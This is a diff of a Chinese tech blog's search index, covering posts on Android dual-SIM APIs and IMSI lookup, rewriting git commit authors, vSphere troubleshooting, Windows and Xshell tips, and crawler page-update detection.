+    <content><![CDATA[<p>在 Android 5.0 以前，各芯片厂商上的双卡开发没有一个统一的标准，以至于做起双卡适配来十分麻烦。<br>Android 5.0 之后，Google 官方统一了双卡平台的适配，并在 Framework 中添加了双卡相关的 API，这对于需要处理双卡的应用来说提供了很大的便利。</p>
+<p>因为 Android 5 上的双卡 API 还不是很完善<br>所以本文是介绍在 Android 6.0 平台上的双卡相关开发<br>后续还会有一篇文章来介绍在双卡处理 Android N 上的实现</p>
+<a id="more"></a>
+
+<p>言归正题<br>在 API 层面上，自 Android 5.0 开始，加入了 SubscriptionManager。双卡相关的处理主要是依赖这个 API，你可以通过 Context 类里面的 getSystemService 方法和 SubscriptionManager.from(Context) 来取得它的对象，当然它内部也是调用的 getSystemService。</p>
+<p>在数据库方面，TelephonyProvider 的 telephony.db 中新增了 siminfo 表来管理双卡的信息<br><img src="https://ooo.0o0.ooo/2017/06/07/5937b4b154014.png" alt="1.png"></p>
+<p><img src="https://ooo.0o0.ooo/2017/06/07/5937cdcfb238e.png" alt="Screenshot_20170607-171729.png"></p>
+<p>由于字段太多，我这里只截图了几个关键的字段<br>需要注意的是 <strong>_id</strong> 和 <strong>sim_id</strong> 这两个字段<br>_id: 这个不用多说，系统要求，自增长，从 0 开始<br>sim_id：该行的卡所在的卡槽值，有 0，1，-1 三个值<br>| 数值 | 描述                        |<br>| :–: |:—————————:|<br>| 0    | 该卡插在卡槽 1 中（主卡槽） |<br>| 1    | 该卡插在卡槽 2 中（副卡槽） |<br>| -1   | 手机内曾经插入过该卡        |<br><em>Ps. 在 Android 6.0+，-1 值已经被移除</em></p>
+<p>每插入一张新的 SIM 卡，siminfo 表中就会插入一行新的数据，然后 _id 会自增长加 1</p>
+<p>详细的各个 API 可以去查阅 API 文档。我这里仅以获取双卡手机两个卡的 IMSI 为例，介绍一下各平台所使用的方法<br>SubId 这个值对于双卡相关的操作来说是必要的</p>
+<p>Android 6.0：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回当前手机所插入 SIM 卡的个数</span></span><br><span class="line">TelePhonyManager.getPhoneCount()</span><br><span class="line"></span><br><span class="line">SubscriptionManager subManager = SubscriptionManager.from(<span class="keyword">this</span>);</span><br><span class="line"><span class="comment">// 这个方法传进手机的卡槽序号，返回对应所插 SIM 卡的信息</span></span><br><span class="line">SubscriptionInfo info = subManager.getActiveSubscriptionInfoForSimSlotIndex(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> subId = info.getSubscriptionId();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该方法在 Android 6.0 中还是 @hide 状态，可以反射调用</span></span><br><span class="line">TelephonyManager teleManager = getSystemService(TelephonyManager.class);</span><br><span class="line">String imsi = teleManager.getSubscriberId(subId);</span><br></pre></td></tr></table></figure>
+
+<p>MTK：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    TelephonyManager teleManager = getSystemService(TelephonyManager.class);</span><br><span class="line">    Class&lt;?&gt; phoneClass = Class.forName(<span class="string">"com.android.internal.telephony.Phone"</span>);</span><br><span class="line"></span><br><span class="line">    Field gemni1Field = phoneClass.getField(<span class="string">"GEMINI_SIM_1"</span>);</span><br><span class="line">    Field gemni2Field = phoneClass.getField(<span class="string">"GEMINI_SIM_2"</span>);</span><br><span class="line">    gemni1Field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    gemni2Field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> simId1 = (<span class="keyword">int</span>) gemni1Field.get(<span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">int</span> simId2 = (<span class="keyword">int</span>) gemni2Field.get(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    Method method = TelephonyManager.class.getDeclaredMethod(<span class="string">"getSubscriberIdGemini"</span>, <span class="keyword">int</span>.class);</span><br><span class="line">    String imsi1 = (String) method.invoke(teleManager, simId1);</span><br><span class="line">    String imsi2 = (String) method.invoke(teleManager, simId2);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>高通：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class&lt;?&gt; msmTeleManager = Class.forName(<span class="string">"android.telephony.MSimTelephonyManager"</span>);</span><br><span class="line">    Method method = msmTeleManager.getMethod(<span class="string">"getSubscriberId"</span>, <span class="keyword">int</span>.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> simId1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> simId2 = <span class="number">1</span>;</span><br><span class="line">    Object phoneMsim = getSystemService(<span class="string">"phone_msim"</span>);</span><br><span class="line"></span><br><span class="line">    String imsi1 = (String) method.invoke(phoneMsim, simId1);</span><br><span class="line">    String imsi2 = (String) method.invoke(phoneMsim, simId2);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对比三种获取双卡 IMSI 的方式，可以看出 Android 原生支持的双卡 API 更加的规范标准。目前新出的 Android 5+ 的新机上基本都采用了原生 API，Android 的碎片化又缩小了一步</p>
+]]></content>
+      <tags>
+        <tag>Android</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>绕过 Android 7.0+ 网络安全配置</title>
     <url>/2018/03/14/network-security-configuration-newer-than-android-n/</url>
     <content><![CDATA[<p>在 Android 7.0 以上的系统中，Google 引入了一种名为网络安全配置（Network Security Configuration）的功能。据官方文档所说，这个功能可以让开发者在一个安全的声明性 XML 配置文件中自定义应用的网络安全设置，而无需修改应用代码。也可以针对特定域和特定应用配置这些设置。<br>可以参考官方文档原文<a id="more"></a><br><a href="https://developer.android.google.cn/training/articles/security-config.html" target="_blank" rel="noopener">https://developer.android.google.cn/training/articles/security-config.html</a></p>
@@ -735,51 +780,6 @@
       </tags>
   </entry>
   <entry>
-    <title>修改 Git 已提交的用户名和邮箱</title>
-    <url>/2016/11/10/modify-git-submitted-commit/</url>
-    <content><![CDATA[<p>有些时候，可能你在 Git 提交的时候不经意间提交了错误的 Commit 作者信息，那么如何修改成正确的呢？</p>
-<p>如果尝试修改 Git 的提交邮箱</p>
-<blockquote>
-<p>git config –global user.name “Your Name”<br>git config –global user.email “Your Email”</p>
-</blockquote>
-<p>这样可以修改作者的名字和邮箱</p>
-<p>但是<br>这种方法只对之后的 Commit 有效，之前提交过的就改不了了…</p>
-<p>还好，Google 到了一种解决办法，这里分享下，也算是做个记录</p>
-<ol>
-<li><p>打开终端（Linux 的终端或 Windows 下 Git 客户端的 git-bash.exe 均可）</p>
-</li>
-<li><p>同步下来你的项目并进入目录（以 repo.git 为例）</p>
-<blockquote>
-<p>git clone –bare <a href="https://github.com/user/repo.git" target="_blank" rel="noopener">https://github.com/user/repo.git</a><br>cd repo.git</p>
-</blockquote>
-</li>
-<li><p>复制下面的脚本，可以直接复制到终端命令行里或新建 Shell 脚本<br>并修改 <strong>oldEmail</strong>, <strong>newName</strong>, <strong>newEmail</strong> 三个变量为你自己的</p>
-<a id="more"></a>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">git filter-branch --env-filter <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">oldEmail="Your Old Email"</span></span><br><span class="line"><span class="string">newName="Your New Name"</span></span><br><span class="line"><span class="string">newEmail="Your New Email"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if [ "$GIT_COMMITTER_EMAIL" = "$oldEmail" ]; then</span></span><br><span class="line"><span class="string">    export GIT_COMMITTER_NAME="$newName"</span></span><br><span class="line"><span class="string">    export GIT_COMMITTER_EMAIL="$newEmail"</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if [ "$GIT_AUTHOR_EMAIL" = "$oldEmail" ]; then</span></span><br><span class="line"><span class="string">    export GIT_AUTHOR_NAME="$newName"</span></span><br><span class="line"><span class="string">    export GIT_AUTHOR_EMAIL="$newEmail"</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span> --tag-name-filter cat -- --branches --tags</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>执行脚本，看到一堆 rewritten 的时候就说明写入完成了</p>
-</li>
-<li><p>git log 查看新的 Commit 信息是否正确</p>
-</li>
-<li><p>提交</p>
-<blockquote>
-<p>git push –force –tags origin ‘refs/heads/*’</p>
-</blockquote>
-</li>
-<li><p>删除临时文件</p>
-<blockquote>
-<p>cd ..<br>rm -rf repo.git</p>
-</blockquote>
-</li>
-</ol>
-<p>需要注意的是，上面的执行后，新 clone 出来的项目 Log 中 Name 和 Email 已经为最新的信息。在执行上面的几步之前已经 clone 出来的项目中，如果执行 git pull 的话，Log 中的 Name 和 Email 信息还是原来的信息</p>
-<p>这样就算是完成了</p>
-]]></content>
-      <tags>
-        <tag>Git</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>使用 Android Studio 动态调试 Smali 代码</title>
     <url>/2017/09/29/using-as-debug-smali-code/</url>
     <content><![CDATA[<h3 id="0x1-准备"><a href="#0x1-准备" class="headerlink" title="0x1 准备"></a>0x1 准备</h3><p>一台可以正常运行 Android Studio / IDEA 的电脑<br>一个顺手的 Smali 代码反编译工具<br>smalidea 插件，可从 <a href="https://bitbucket.org/JesusFreke/smali/downloads/" target="_blank" rel="noopener">这里</a> 获取，baksmali 工具也有<br>你需要有一个目标 APK 文件，这里我新建的一个测试项目为例</p>
@@ -808,329 +808,6 @@
 ]]></content>
       <tags>
         <tag>Android逆向</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows10 USB-To-Console 串口驱动 (x86 x64)</title>
-    <url>/2017/02/28/win10-usb-to-console/</url>
-    <content><![CDATA[<p>最近将 Win10 更新到 14393，之前的 USB 转串口线一插上就蓝屏重启，费了好多功夫 Google 到了之前版本的驱动，试了试居然没事了，这里就分享下吧</p>
-<p>下载地址：<a href="https://lanzous.com/iQxbyers9ha" target="_blank" rel="noopener">蓝奏云</a></p>
-<p>Step1. 进入 Step1 文件夹，安装 Setup.exe。如果成功，则无需进行第二步了。</p>
-<p>Step2. 进入 Step2 文件夹，安装 CH341SER.EXE。不行的话再安装 HL-340.EXE。</p>
-<p>Windows10 专业版 x64 测试通过。</p>
-]]></content>
-      <tags>
-        <tag>网络</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vShere Client 无法连接 vCenter 故障排查思路</title>
-    <url>/2017/07/14/vsphere-server-problem-check/</url>
-    <content><![CDATA[<p>问题如图所示，vSphere Client 弹框无法连接到 vCenter，只提示出现未知错误<br><img src="https://ooo.0o0.ooo/2017/07/14/5968a5d706d37.jpg" alt></p>
-<p>这类问题一般不好排查，因为没有给出错误的具体信息，错误提示或者错误代码。我这里结合实例，总结一下该类问题的排查思路</p>
-<a id="more"></a>
-
-<p><strong>1. 检查网络连接情况；检查 vCenter 的 IP，用户名，密码是否正确</strong></p>
-<blockquote>
-<p>这个在大多数出现在实验环境中，生产环境中一般不会出现这种错误<br>解决办法也没什么好说的，ping 检查连接，用户名密码换成正确的</p>
-</blockquote>
-<p><strong>2. 检查 vCenter 的 Web Client 能否正常访问</strong></p>
-<blockquote>
-<p>vCenter 是可以从 Web 端访问管理的<br>URL 是：<a href="https://client-hostname:port/vsphere-client" target="_blank" rel="noopener">https://client-hostname:port/vsphere-client</a><br>默认情况下此端口为 9443，但可在 vSphere Web Client 安装过程中更改此端口</p>
-</blockquote>
-<p>这里打开并输入正确的用户名密码，发现可以正常访问，说明 vCenter 整个本身是没有什么问题的</p>
-<p><strong>3. 检查 VMware VirtualCenter Server 服务是否已经启动</strong></p>
-<blockquote>
-<p>VMware VirtualCenter Server 是 vCenter 的核心服务，无法连接的原因大部分是因为这个服务没有启动<br>使用 <strong>远程桌面</strong> 连接到 vCenter 所在的虚拟机，打开 <strong>服务器管理器 - 诊断 - 服务</strong>，找到这个服务，检查其状态</p>
-</blockquote>
-<p>我所在的环境是一个 vCenter 虚拟机通过 Platform Services Controller 去管理多个安装了 VMWare ESXi 底机。由于所在环境出于安全起见，在 vCenter Server 安装时禁止了 vCenter 虚拟机的远程桌面权限，所以这里采用另一种方式跳转上去</p>
-<p>由于 VMWare ESXi 底机是允许通过 vSphere Client 连接去管理单个的实体服务器的，而这种方式不需要依赖 VMware VirtualCenter Server 服务。所以我这里先连接 vCenter 虚拟机所在的那台实体服务器，再在其中打开控制台</p>
-<p>打开后检查，发现这个服务确实是没有正常启动<br><img src="https://i.loli.net/2017/07/14/5968b6b4dfdaf.png" alt="2.png"></p>
-<p><strong>4. VMware VirtualCenter Server 服务无法正常启动</strong></p>
-<blockquote>
-<p>一般来说，若是该服务没有启动，手动启用后便可恢复正常。但有些情况下无法手动启动，这时候就要结合具体情况来分析了<br>vCenter Server 的正常运行是需要依赖数据库的，所以先应该检查数据库的相关服务有没有正常运行<br>vCenter Server 在安装时是会将其核心服务设置为开机自启的。所以，如果在其启动时数据库服务没有正常运行，就会出现问题。我习惯的做法是将数据库相关服务的启动类型设置为 <strong>自动</strong>，而把 vCenter Server 相关服务设置为 <strong>自动（延迟启动）</strong>，来保证数据库服务优于 vCenter Server 服务启动。</p>
-</blockquote>
-<p><strong>5. VMware VirtualCenter Server 服务正常启动了还是不能连接</strong></p>
-<blockquote>
-<p>通常情况下，vCenter Server，vCenter 依赖的数据库和其他业务服务都是分开机器安装的，但也有安装在一台虚拟机中的情况<br>因为 vCenter Server 需要使用 80 端口，所以保证该端口的正常通信是必要的。可以使用 telnet 命令来检查端口是否已经开启，例如 telnet 10.100.100.14 80。如果不通，就要检查各防火墙的出入栈规则了<br>另外 Web 服务也会占用 80 端口来进行通信，这个也要仔细甄别</p>
-</blockquote>
-<p>关于 vCenter 服务的相关问题实在太多，这里只是整理了一些思路来帮助检查<br>对于这种问题没有什么好办法，就是查看日志来找问题原因。</p>
-]]></content>
-      <tags>
-        <tag>网络</tag>
-        <tag>vSphere</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows10 删除多余的网络配置项</title>
-    <url>/2017/03/24/win10-delete-network-config/</url>
-    <content><![CDATA[<p>1.Win + R 运行，输入 <strong>regedit</strong>，打开注册表编辑器<br>2.找到下面两个键</p>
-<blockquote>
-<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\NetworkList\Profiles</p>
-</blockquote>
-<blockquote>
-<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\NetworkList\Signatures\Unmanaged</p>
-</blockquote>
-<p>3.在这两个键的下面有一堆 Hash 值命名的目录</p>
-<a id="more"></a>
-<p><img src="https://ooo.0o0.ooo/2017/03/24/58d476ba75381.png" alt="snipaste20170324_092802.png"></p>
-<p>不需要哪个删除就是了</p>
-<p>可以根据目录里面 <strong>ProfileName</strong> 的值来判断这个目录是属于哪个网络配置的<br><img src="https://ooo.0o0.ooo/2017/03/24/58d476ba4185f.png" alt="2.png"></p>
-<p>同样，如果需要修改网络配置的名字，也可以从这里修改 <strong>ProfileName</strong> 的值</p>
-<p>修改注册表有一定风险，请一定要仔细</p>
-]]></content>
-      <tags>
-        <tag>Windows</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>解决 Xshell SSH 连接 Linux 中文乱码</title>
-    <url>/2017/04/29/xshell-ssh-chinaese-utf8/</url>
-    <content><![CDATA[<h2 id="0x0"><a href="#0x0" class="headerlink" title="0x0"></a>0x0</h2><p>首先需要确保你的 Xshell 的连接编码是 UTF-8。<br>虽然可以修改 Linux 端的字符集去迎合 Windows 端做到中文的正常显示，但在当前 I18N 的大环境下，还是尽量用 UTF-8 吧。</p>
-<p>打开 Xshell 的会话属性窗口，在左边选择到 <strong>终端</strong>，编码一项内，如果不是 Unicode 的话请改成 Unicode</p>
-<a id="more"></a>
-<p><img src="https://ooo.0o0.ooo/2017/04/15/58f1eda7c1d25.png" alt="1.png"></p>
-<h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p>不出意外的话，重新连接你的 SSH 应该已经能正常显示中文了，因为大部分 Linux 的默认连接编码就是 UTF-8 的。</p>
-<p>如果还是不能正常显示，你需要这样做<br>修改 <strong>/etc/profile</strong> 这个文件<br>在其中添加</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> LC_ALL=<span class="string">"zh_CN.UTF-8"</span></span><br></pre></td></tr></table></figure>
-
-<p>这条命令的意思是设置 Locale 为 UTF-8，会在用户初始化时执行</p>
-<p>重启系统，这里中文已经能正常显示了<br><img src="https://ooo.0o0.ooo/2017/04/15/58f1eec23e82d.png" alt="2.png"></p>
-]]></content>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows 环境变量的设置是否需要重启</title>
-    <url>/2016/12/25/windows-set-env-variable/</url>
-    <content><![CDATA[<p>最近从 Android Studio 导入一个项目，提示需要配置一个叫 ANDROID_SDK_HOME 的环境变量，然而 Google 的提示是建议我配置完之后重启，但是我实测配置之后没有重启也生效了，这是怎么回事呢？</p>
-<p>原来，环境变量就是属于 Windows 系统的一些预定义好的变量，其中分为用户变量和系统变量。用户变量只对当前设置环境变量的这个用户生效，系统变量则对整个系统生效。这些变量在用户登录时被设置，应用到系统里，对系统里运行的每一个程序都生效。</p>
-<p>在一个程序启动的时候，它所可以读取的环境变量就会被复制到它所在的环境中。也就是说，每个程序在运行时都会拥有原始环境变量的一份复制体，不会受其他程序的影响。</p>
-<p>所以结果就是，只要重新运行该程序，程序就会重新读取系统的环境变量，环境变量也就发生改变了。而如果修改的是系统要使用的环境变量，也就必须重启系统了。</p>
-]]></content>
-      <tags>
-        <tag>Windows</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2020/07/28/0/</url>
-    <content><![CDATA[<table>
-    <tr>
-        <th colspan="5" style="text-align:center">发动机转速(rpm)</th>
-        <th rowspan="2" style="text-align:center">车速(Km/h)</th>
-    </tr>
-    <tr>
-        <th style="text-align:center">1档</th>
-        <th style="text-align:center">2档</th>
-        <th style="text-align:center">3档</th>
-        <th style="text-align:center">4档</th>
-        <th style="text-align:center">5档</th>
-    </tr>
-    <tr>
-        <td style="text-align:center">557</td>
-        <td style="text-align:center">308</td>
-        <td style="text-align:center">197</td>
-        <td style="text-align:center">147</td>
-        <td style="text-align:center">111</td>
-        <td style="text-align:center">5</td>
-    </tr><tr>
-        <td style="text-align:center">1115</td>
-        <td style="text-align:center">615</td>
-        <td style="text-align:center">393</td>
-        <td style="text-align:center">294</td>
-        <td style="text-align:center">222</td>
-        <td style="text-align:center">10</td>
-    </tr><tr>
-        <td style="text-align:center">1672</td>
-        <td style="text-align:center">923</td>
-        <td style="text-align:center">590</td>
-        <td style="text-align:center">441</td>
-        <td style="text-align:center">333</td>
-        <td style="text-align:center">15</td>
-    </tr><tr>
-        <td style="text-align:center">2229</td>
-        <td style="text-align:center">1231</td>
-        <td style="text-align:center">786</td>
-        <td style="text-align:center">587</td>
-        <td style="text-align:center">444</td>
-        <td style="text-align:center">20</td>
-    </tr><tr>
-        <td style="text-align:center">2787</td>
-        <td style="text-align:center">1538</td>
-        <td style="text-align:center">983</td>
-        <td style="text-align:center">734</td>
-        <td style="text-align:center">555</td>
-        <td style="text-align:center">25</td>
-    </tr><tr>
-        <td style="text-align:center">3344</td>
-        <td style="text-align:center">1846</td>
-        <td style="text-align:center">1180</td>
-        <td style="text-align:center">881</td>
-        <td style="text-align:center">666</td>
-        <td style="text-align:center">30</td>
-    </tr><tr>
-        <td style="text-align:center">3901</td>
-        <td style="text-align:center">2154</td>
-        <td style="text-align:center">1376</td>
-        <td style="text-align:center">1028</td>
-        <td style="text-align:center">776</td>
-        <td style="text-align:center">35</td>
-    </tr><tr>
-        <td style="text-align:center">4459</td>
-        <td style="text-align:center">2461</td>
-        <td style="text-align:center">1573</td>
-        <td style="text-align:center">1175</td>
-        <td style="text-align:center">887</td>
-        <td style="text-align:center">40</td>
-    </tr><tr>
-        <td style="text-align:center">5016</td>
-        <td style="text-align:center">2769</td>
-        <td style="text-align:center">1769</td>
-        <td style="text-align:center">1322</td>
-        <td style="text-align:center">998</td>
-        <td style="text-align:center">45</td>
-    </tr><tr>
-        <td style="text-align:center">5573</td>
-        <td style="text-align:center">3077</td>
-        <td style="text-align:center">1966</td>
-        <td style="text-align:center">1469</td>
-        <td style="text-align:center">1109</td>
-        <td style="text-align:center">50</td>
-    </tr><tr>
-        <td style="text-align:center">6131</td>
-        <td style="text-align:center">3384</td>
-        <td style="text-align:center">2163</td>
-        <td style="text-align:center">1615</td>
-        <td style="text-align:center">1220</td>
-        <td style="text-align:center">55</td>
-    </tr><tr>
-        <td style="text-align:center">6688</td>
-        <td style="text-align:center">3692</td>
-        <td style="text-align:center">2359</td>
-        <td style="text-align:center">1762</td>
-        <td style="text-align:center">1331</td>
-        <td style="text-align:center">60</td>
-    </tr><tr>
-        <td style="text-align:center">7245</td>
-        <td style="text-align:center">4000</td>
-        <td style="text-align:center">2556</td>
-        <td style="text-align:center">1909</td>
-        <td style="text-align:center">1442</td>
-        <td style="text-align:center">65</td>
-    </tr><tr>
-        <td style="text-align:center">7802</td>
-        <td style="text-align:center">4307</td>
-        <td style="text-align:center">2753</td>
-        <td style="text-align:center">2056</td>
-        <td style="text-align:center">1553</td>
-        <td style="text-align:center">70</td>
-    </tr><tr>
-        <td style="text-align:center">8360</td>
-        <td style="text-align:center">4615</td>
-        <td style="text-align:center">2949</td>
-        <td style="text-align:center">2203</td>
-        <td style="text-align:center">1664</td>
-        <td style="text-align:center">75</td>
-    </tr><tr>
-        <td style="text-align:center">8917</td>
-        <td style="text-align:center">4923</td>
-        <td style="text-align:center">3146</td>
-        <td style="text-align:center">2350</td>
-        <td style="text-align:center">1775</td>
-        <td style="text-align:center">80</td>
-    </tr><tr>
-        <td style="text-align:center">9474</td>
-        <td style="text-align:center">5230</td>
-        <td style="text-align:center">3342</td>
-        <td style="text-align:center">2496</td>
-        <td style="text-align:center">1886</td>
-        <td style="text-align:center">85</td>
-    </tr><tr>
-        <td style="text-align:center">10032</td>
-        <td style="text-align:center">5538</td>
-        <td style="text-align:center">3539</td>
-        <td style="text-align:center">2643</td>
-        <td style="text-align:center">1997</td>
-        <td style="text-align:center">90</td>
-    </tr><tr>
-        <td style="text-align:center">10589</td>
-        <td style="text-align:center">5846</td>
-        <td style="text-align:center">3736</td>
-        <td style="text-align:center">2790</td>
-        <td style="text-align:center">2108</td>
-        <td style="text-align:center">95</td>
-    </tr><tr>
-        <td style="text-align:center">11146</td>
-        <td style="text-align:center">6153</td>
-        <td style="text-align:center">3932</td>
-        <td style="text-align:center">2937</td>
-        <td style="text-align:center">2218</td>
-        <td style="text-align:center">100</td>
-    </tr><tr>
-        <td style="text-align:center">11704</td>
-        <td style="text-align:center">6461</td>
-        <td style="text-align:center">4129</td>
-        <td style="text-align:center">3084</td>
-        <td style="text-align:center">2329</td>
-        <td style="text-align:center">105</td>
-    </tr><tr>
-        <td style="text-align:center">12261</td>
-        <td style="text-align:center">6769</td>
-        <td style="text-align:center">4325</td>
-        <td style="text-align:center">3231</td>
-        <td style="text-align:center">2440</td>
-        <td style="text-align:center">110</td>
-    </tr><tr>
-        <td style="text-align:center">12818</td>
-        <td style="text-align:center">7076</td>
-        <td style="text-align:center">4522</td>
-        <td style="text-align:center">3378</td>
-        <td style="text-align:center">2551</td>
-        <td style="text-align:center">115</td>
-    </tr><tr>
-        <td style="text-align:center">13376</td>
-        <td style="text-align:center">7384</td>
-        <td style="text-align:center">4719</td>
-        <td style="text-align:center">3524</td>
-        <td style="text-align:center">2662</td>
-        <td style="text-align:center">120</td>
-</tr></table>]]></content>
-  </entry>
-  <entry>
-    <title>如何判断一个页面是否更新？</title>
-    <url>/2020/05/21/whether-page-is-updated/</url>
-    <content><![CDATA[<p>对于需要长期运行的爬虫程序，在每次爬取前检查目标页面是否更新是十分重要的。如果不进行判断，就会对同一个页面重复爬取多次，浪费时间和性能。</p>
-<a id="more"></a>
-
-<h3 id="定时爬取"><a href="#定时爬取" class="headerlink" title="定时爬取"></a>定时爬取</h3><p>这种方式即为最传统的方式，无论页面是否更新，都会每隔一段时间对页面爬取一次。<br>同时，根据定时方式，又分为在程序内手动轮询计时和使用第三方定时程序两种。</p>
-<p>不推荐使用这种方法，效率低下。一定要用的话也建议使用 crontab 等其他程序定时调用，尽可能的在等待时间内不占用系统资源。</p>
-<hr>
-<h3 id="304-HTTP-状态码"><a href="#304-HTTP-状态码" class="headerlink" title="304 HTTP 状态码"></a>304 HTTP 状态码</h3><p>HTTP 头字段中定义了一个 304 状态码 ( 304 Not Modified )，这个请求头标签原本是供浏览器缓存用的，现代浏览器通常会缓存网页文件在自己的数据目录中，以便下次能更快的加载。</p>
-<p>在浏览器请求页面时，会把本地缓存的网页文件的最后修改时间放在请求头一起发送到服务器。服务器根据这个时间判断，如果页面有更新，会返回 HTTP 状态码 200，正常响应。如果页面没有更新，会返回 HTTP 状态码 304（不返回网页内容，只返回响应头）。</p>
-<p>那么作为爬虫，就可以模拟浏览器的这个行为，在本次爬取后记录爬取的时间，下一次爬取前在请求头中放入 <strong>If-Modified-Since</strong>，把上次爬取的时间一起发送给服务器，然后根据响应的 HTTP 状态码进行下一步操作。</p>
-<p>这种方法看似完美，但是很可惜，因为并不是所有服务器都会遵守规范返回 304 状态码。对于后端渲染的动态页面，或是前端渲染的单页面应用，这种方法也不合适。</p>
-<hr>
-<h3 id="Last-Modified-响应字段"><a href="#Last-Modified-响应字段" class="headerlink" title="Last-Modified 响应字段"></a>Last-Modified 响应字段</h3><p>根据 HTTP 规范，响应头中还有一个 <strong>Last-Modified</strong> 字段来返回页面最后一次的修改时间。<br>将这个时间与上一次爬取的时间做对比即可判断出页面是否更新。</p>
-<p>很可惜，这种方法基本只适用于静态页面。对于动态页面来说，返回的最后修改时间就是发回 Response 的时间，因为动态页面本来就是即时渲染的。</p>
-<hr>
-<h3 id="Etag-响应字段"><a href="#Etag-响应字段" class="headerlink" title="Etag 响应字段"></a>Etag 响应字段</h3><p><strong>Etag</strong> 主要为了解决前两个无法解决的一些问题而被创造出来的，例如：</p>
-<ul>
-<li>一些文件也许仅仅改变了修改时间，内容并没有改变</li>
-<li><strong>If-Modified-Since</strong> 的检查粒度是秒级的，无法做到更精确的检查</li>
-<li>服务器无法控制</li>
-</ul>
-<p>支持 <strong>Etag</strong> 的服务器会像返回 <strong>Last-Modified</strong> 那样返回一个<strong>Etag</strong> 字符串，客户端请求时根据需要在请求头的 <strong>If-Match</strong> 或 <strong>If-None-Match</strong>（更常用）字段中放入上次请求得来的 <strong>Etag</strong> 字符串，然后服务器会根据 <strong>Etag</strong> 作出与 <strong>If-Modified-Since</strong> 同样的响应。</p>
-<p>这种方法的最大问题就是服务器不一定支持。<strong>Etag</strong> 本身也是服务器根据一定规则计算出来的，有计算就有性能消耗，就看服务器愿不愿意支持了。</p>
-<hr>
-<h3 id="基于页面地址的比较"><a href="#基于页面地址的比较" class="headerlink" title="基于页面地址的比较"></a>基于页面地址的比较</h3><p>在本次爬取后，保存爬取的 URL，一段时间内爬过的就不用再爬了。如果页面 URL 中有诸如 ID 之类的参数的话，可以使用 ID，因为 ID 在后端中通常是唯一的。经常与 <strong>定时爬取</strong> 配合使用。</p>
-<hr>
-<h3 id="基于页面内容的比较"><a href="#基于页面内容的比较" class="headerlink" title="基于页面内容的比较"></a>基于页面内容的比较</h3><p>在本次爬取后，抽取页面关键元素的内容计算 MD5 并保存，下次爬取时比较 MD5 判断是否更新。如果关键内容不多的话，也可以不做 MD5 直接保存。</p>
-<p>不建议直接保存整个页面全部内容或其 MD5，因为如果页面中有 <em>本站已运行 xx 时间、访客：xx</em> 之类不断更新的内容，就会造成误判。</p>
-]]></content>
-      <tags>
-        <tag>爬虫</tag>
       </tags>
   </entry>
   <entry>
@@ -1180,6 +857,144 @@
 ]]></content>
       <tags>
         <tag>Android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>如何判断一个页面是否更新？</title>
+    <url>/2020/05/21/whether-page-is-updated/</url>
+    <content><![CDATA[<p>对于需要长期运行的爬虫程序，在每次爬取前检查目标页面是否更新是十分重要的。如果不进行判断，就会对同一个页面重复爬取多次，浪费时间和性能。</p>
+<a id="more"></a>
+
+<h3 id="定时爬取"><a href="#定时爬取" class="headerlink" title="定时爬取"></a>定时爬取</h3><p>这种方式即为最传统的方式，无论页面是否更新，都会每隔一段时间对页面爬取一次。<br>同时，根据定时方式，又分为在程序内手动轮询计时和使用第三方定时程序两种。</p>
+<p>不推荐使用这种方法，效率低下。一定要用的话也建议使用 crontab 等其他程序定时调用，尽可能的在等待时间内不占用系统资源。</p>
+<hr>
+<h3 id="304-HTTP-状态码"><a href="#304-HTTP-状态码" class="headerlink" title="304 HTTP 状态码"></a>304 HTTP 状态码</h3><p>HTTP 头字段中定义了一个 304 状态码 ( 304 Not Modified )，这个请求头标签原本是供浏览器缓存用的，现代浏览器通常会缓存网页文件在自己的数据目录中，以便下次能更快的加载。</p>
